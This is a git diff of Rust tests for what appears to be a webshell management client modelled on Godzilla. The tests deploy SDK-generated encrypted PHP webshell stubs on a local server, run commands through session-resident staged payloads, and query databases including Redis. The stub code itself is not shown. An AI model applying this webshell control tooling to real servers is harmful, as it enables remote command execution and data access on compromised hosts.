+            handler.contains("$l>0?$l:null"),
             "分阶段处理器的 read 必须支持长度参数"
         );
         assert!(
@@ -2291,21 +2462,22 @@ mod tests {
 
     #[test]
     fn real_php_session_variants_round_trip() {
-        // Godzilla 分阶段载荷应用到所有编码器：每个编码器以 session 模式真实往返
-        let encoders = [
-            "native",
-            "native_aes_ecb",
-            "native_aes_cbc",
-            "native_des",
-            "native_chacha20",
-            "native_rabbit",
-        ];
+        // 分阶段载荷（session 模式）真实往返：按注册表遍历全部编码器。
+        //
+        // 历史缺口：数组里只列了 6 个 native 变体，而下方 `encoder_id == "xor_session"`
+        // 的分支永远不成立 —— 唯一真正以 session 通道工作的编码器反而没被测到。
+        let mut encoder_ids: Vec<String> = dosword_sdk::EncoderRegistry::global()
+            .list()
+            .into_iter()
+            .map(|(id, _)| id)
+            .collect();
+        // custom 的 stub 由用户上传，客户端只约定 legacy 表单契约（k/x），不做 session 往返
+        encoder_ids.retain(|id| id != "custom");
+
         let settings = settings();
-        for encoder_id in encoders {
-            if encoder_id == "native_des" && !php_supports_des_ecb() {
-                eprintln!(
-                    "跳过 native_des session：当前 php 的 OpenSSL 不支持 DES-ECB（OpenSSL 3 需加载 legacy provider）"
-                );
+        for encoder_id in &encoder_ids {
+            if encoder_id.contains("des") && !php_supports_des_ecb() {
+                eprintln!("跳过 {encoder_id} session：当前 php 的 OpenSSL 不支持 DES-ECB");
                 continue;
             }
             let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", true)
@@ -2315,23 +2487,104 @@ mod tests {
             };
             let mut profile = profile(&url);
             // xor_session 编码器本身即 session；其余通过 protocol_params 开启
-            if encoder_id == "xor_session" {
-                profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
+            profile.protocol_params = if encoder_id == "xor_session" {
+                format!(r#"{{"encoder":"{encoder_id}"}}"#)
             } else {
-                profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}","session":true}}"#);
-            }
-            let result = (|| -> Result<String, ProtocolError> {
+                format!(r#"{{"encoder":"{encoder_id}","session":true}}"#)
+            };
+            let result = (|| -> Result<Vec<String>, ProtocolError> {
                 let (session, _) = PhpProtocol.connect(&profile, &settings)?;
-                let output =
-                    PhpProtocol.execute_command(session.as_ref(), "printf sess-ok", &settings)?;
-                Ok(output.stdout)
+                // 连跑两次：验证处理器确实驻留在服务端 session（第二次不再注入）
+                let mut outputs = Vec::new();
+                for command in ["printf sess-ok", "printf sess-again"] {
+                    outputs.push(
+                        PhpProtocol
+                            .execute_command(session.as_ref(), command, &settings)?
+                            .stdout,
+                    );
+                }
+                Ok(outputs)
             })();
             let _ = child.kill();
             let _ = child.wait();
             let _ = std::fs::remove_dir_all(&dir);
-            let stdout = result
+            let outputs = result
                 .unwrap_or_else(|error| panic!("{encoder_id} session 真实执行应成功：{error}"));
-            assert_eq!(stdout.trim(), "sess-ok", "{encoder_id} session 输出不符");
+            assert_eq!(
+                outputs[0].trim(),
+                "sess-ok",
+                "{encoder_id} session 输出不符"
+            );
+            assert_eq!(
+                outputs[1].trim(),
+                "sess-again",
+                "{encoder_id} session 第二次调用不符（处理器未驻留？）"
+            );
+        }
+    }
+
+    /// 通道对齐：三条通道（NATIVE 内置分发 / 分阶段载荷 / legacy 逐请求代码）
+    /// 对同一个数据库都必须能探测与查询。
+    ///
+    /// 历史缺陷：分阶段通道的处理器只支持 mysql/pgsql/sqlite（无 mssql/oracle/redis），
+    /// legacy 通道只在客户端拼 PDO DSN 且**显式拒绝 redis** —— 同一个 Shell
+    /// 换个编码器就少一半数据库能力。这里用 redis mock 做真实验证
+    /// （本机 php 无 pdo_sqlite，redis 走裸 RESP 不需要任何扩展）。
+    #[test]
+    fn real_php_db_round_trip_on_all_channels() {
+        let settings = settings();
+        let mock_script = std::env::temp_dir().join("dosword_redis_mock_channels.py");
+        let _ = std::fs::write(&mock_script, REDIS_MOCK);
+        let port: u16 = 20000 + (std::process::id() % 1000) as u16;
+        let mock = std::process::Command::new("python3")
+            .arg(&mock_script)
+            .arg(port.to_string())
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn();
+        if mock.is_err() || !crate::protocol::wait_tcp_ready(port, 10_000) {
+            eprintln!("跳过：python3 redis mock 未就绪");
+            return;
+        }
+        let redis = DbConnection {
+            driver: "redis".into(),
+            host: Some("127.0.0.1".into()),
+            port: Some(port),
+            username: None,
+            password: None,
+            dbname: None,
+        };
+        // native=内置分发；xor_session=分阶段载荷；base64=legacy 逐请求代码
+        for encoder_id in ["native", "xor_session", "base64"] {
+            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false)
+            else {
+                eprintln!("跳过 {encoder_id}：未检测到 php");
+                return;
+            };
+            let mut profile = profile(&url);
+            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
+            let result = (|| -> Result<(), ProtocolError> {
+                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
+                let probe = PhpProtocol.db_probe(session.as_ref(), &redis, &settings)?;
+                assert_eq!(probe.driver, "redis");
+                assert!(
+                    probe.databases.contains(&"0".to_string()),
+                    "{encoder_id} 应列出 redis 库：{:?}",
+                    probe.databases
+                );
+                let query =
+                    PhpProtocol.db_query(session.as_ref(), &redis, "GET mykey", &settings)?;
+                assert_eq!(
+                    query.rows,
+                    vec![vec![Some("hello".to_string())]],
+                    "{encoder_id} redis GET 结果不符"
+                );
+                Ok(())
+            })();
+            let _ = child.kill();
+            let _ = child.wait();
+            let _ = std::fs::remove_dir_all(&dir);
+            result.unwrap_or_else(|error| panic!("{encoder_id} 数据库往返失败：{error}"));
         }
     }
 
@@ -3094,35 +3347,18 @@ except Exception as e:
 "#;
 
     #[test]
-    fn build_dsn_dispatches_each_driver() {
-        let base = |driver: &str| DbConnection {
-            driver: driver.to_string(),
-            host: Some("db.local".into()),
-            port: None,
-            username: None,
-            password: None,
-            dbname: Some("app".into()),
-        };
-        assert!(
-            build_dsn(&base("mysql"), true)
-                .unwrap()
-                .starts_with("mysql:")
-        );
-        assert_eq!(
-            build_dsn(&base("pgsql"), false).unwrap(),
-            "pgsql:host=db.local;port=5432;dbname=app"
-        );
-        assert_eq!(
-            build_dsn(&base("mssql"), true).unwrap(),
-            "sqlsrv:Server=db.local,1433;Database=app"
-        );
-        assert_eq!(
-            build_dsn(&base("oracle"), true).unwrap(),
-            "oci:dbname=//db.local:1521/app"
-        );
-        // Redis 不走 PDO，必须显式拒绝而不是静默变成 pgsql
-        assert!(build_dsn(&base("redis"), true).is_err());
-        assert_eq!(build_dsn(&base("sqlite"), true).unwrap(), "sqlite:app");
+    fn driver_whitelist_accepts_all_six_and_rejects_others() {
+        // 驱动白名单仍由客户端校验（防任意驱动字符串直达目标）；
+        // DSN 拼装已下移到 stub 端实现（session/legacy 与 NATIVE 同构），
+        // 因此这里只守住白名单，DSN 行为由 php_impl_matches_native_stub 与
+        // 真实 PHP 往返测试覆盖。
+        for driver in ["mysql", "pgsql", "sqlite", "mssql", "oracle", "redis"] {
+            assert!(check_driver(driver).is_ok(), "{driver} 应在白名单内");
+        }
+        // Redis 曾经被 build_dsn 显式拒绝（"仅 NATIVE 编码器可用"），
+        // 现在三条通道都由 stub 端裸 RESP 实现，不再拒绝
+        assert!(check_driver("redis").is_ok(), "redis 应在白名单内");
+        assert!(check_driver("mongodb").is_err(), "未知驱动必须拒绝");
     }
 
     /// AEAD：真实 PHP 往返（HKDF + AES-256-GCM + 序号递增 + 重放拒绝）。
@@ -3923,6 +4159,25 @@ except Exception as e:
         password: &str,
         session: bool,
     ) -> Option<(String, std::path::PathBuf, std::process::Child)> {
+        let encoder = dosword_sdk::EncoderRegistry::global().get(encoder_id)?;
+        // 部署 SDK 生成的 stub（顺带验证生成器产物的真实可运行性）
+        let stub = if session {
+            encoder.stub_session("php", password).ok()?
+        } else {
+            encoder.stub("php", password).ok()?
+        };
+        spawn_php_server_stub(&stub, encoder_id, session)
+    }
+
+    /// 用**给定的 stub 内容**起 `php -S`（`encoder_id` / `session` 只用于决定启动参数）。
+    ///
+    /// 供「旧 stub 兼容」类用例使用：需要部署一份**改造过的** stub（例如抹掉能力上报
+    /// 字段以模拟旧版本），而 `spawn_php_server_with` 只能部署 SDK 现产出的 stub。
+    fn spawn_php_server_stub(
+        stub: &str,
+        encoder_id: &str,
+        session: bool,
+    ) -> Option<(String, std::path::PathBuf, std::process::Child)> {
         // 缺 php 时测试会静默跳过——CI 上这等于"假绿"。
         // 设置 DOSWORD_REQUIRE_PHP=1 可把跳过变成硬失败（CI 已启用）。
         let require_php = std::env::var("DOSWORD_REQUIRE_PHP").is_ok();
@@ -3939,15 +4194,8 @@ except Exception as e:
             }
         };
         let _ = php;
-        let encoder = dosword_sdk::EncoderRegistry::global().get(encoder_id)?;
         let dir = std::env::temp_dir().join(format!("dosword-php-{}", uuid::Uuid::new_v4()));
         std::fs::create_dir_all(&dir).ok()?;
-        // 部署 SDK 生成的 stub（顺带验证生成器产物的真实可运行性）
-        let stub = if session {
-            encoder.stub_session("php", password).ok()?
-        } else {
-            encoder.stub("php", password).ok()?
-        };
         std::fs::write(dir.join("shell.php"), stub).ok()?;
         std::fs::create_dir_all(dir.join("www")).ok()?;
         std::fs::write(dir.join("www/hello.txt"), b"hello dosword").ok()?;
